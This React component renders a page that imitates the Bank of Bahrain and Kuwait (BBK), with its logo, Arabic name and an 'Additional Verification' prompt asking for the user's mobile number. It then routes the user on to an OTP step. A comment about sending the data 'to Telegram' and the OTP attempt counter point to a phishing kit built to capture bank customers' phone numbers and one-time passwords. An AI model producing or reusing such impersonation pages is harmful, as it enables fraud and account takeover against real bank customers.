// Personalinfo.jsx
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const Personalinfo = () => {
  const [mobile, setMobile] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate(); // React Router navigation

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validation
    const digitsOnly = mobile.replace(/\D/g, "");
    if (!mobile) {
      alert("Please enter your mobile number");
      return;
    }
    if (digitsOnly.length < 8) {
      alert("Please enter a valid mobile number");
      return;
    }

    setLoading(true);

    try {
      // Simulate sending data to Telegram or backend
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Save data to sessionStorage for next step
      sessionStorage.setItem("bbk_mobile_number", mobile);
      sessionStorage.setItem("personal_info_stage", "true");
      sessionStorage.setItem("otp_attempts", "0");

      // Navigate to OTP page using React Router
      navigate("/bbklogin"); // <-- Replace "otp" with your actual OTP route
    } catch (err) {
      console.error(err);
      alert("Failed to process information. Please try again.");
      setLoading(false);
    }
  };

  const formatMobile = (value) => {
    let digits = value.replace(/\D/g, "");
    if (digits.length <= 8) {
      digits = digits.replace(/(\d{4})(\d{4})/, "$1 $2");
    } else {
      digits = "+" + digits;
    }
    return digits;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#4A90E2] via-[#2E5BBA] to-[#1E3A8A] text-white flex flex-col items-center px-6 py-10">
      {/* Logo */}
      <div className="w-full max-w-sm flex justify-end mb-16 mt-5">
        <div className="flex flex-col items-center text-center relative">
          <div className="text-3xl font-bold tracking-wide relative">
            BBK
            <span className="absolute -right-4 -top-1 text-xl">✱</span>
          </div>
          <div className="text-xs opacity-90 rtl mt-1">بنك البحرين والكويت</div>
        </div>
      </div>

      {/* Info Text */}
      <div className="w-full max-w-sm text-center mb-16">
        <h1 className="text-2xl font-light mb-5">Additional Verification</h1>
        <p className="text-sm opacity-80 leading-relaxed">
          For your security, please provide the following information to complete the verification process
        </p>
      </div>

      {/* Form */}
      <form
        onSubmit={handleSubmit}
        className="w-full max-w-sm flex flex-col gap-10"
      >
        <input
          type="tel"
          placeholder="Mobile Number *"
          value={mobile}
          onChange={(e) => setMobile(formatMobile(e.target.value))}
          className="w-full bg-transparent border-b border-white/50 py-3 text-white placeholder-white/70 outline-none focus:border-white transition"
        />

        <button
          type="submit"
          disabled={loading || !mobile}
          className={`w-full py-4 text-lg font-medium rounded-full transition transform hover:-translate-y-0.5 flex items-center justify-center gap-2 ${
            loading || !mobile
              ? "bg-white/20 cursor-not-allowed opacity-60"
              : "bg-white/20 hover:bg-white/30"
          }`}
        >
          {loading && (
            <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
          )}
          {loading ? "Processing..." : "Continue"}
        </button>
      </form>

      {/* Back Button */}
      <div className="w-full max-w-sm text-center mt-10">
        <button
          onClick={() => navigate(-1)} // navigate to previous page
          className="text-white/90 hover:text-white hover:underline text-base font-light"
        >
          ← Back
        </button>
      </div>
    </div>
  );
};

export default Personalinfo;
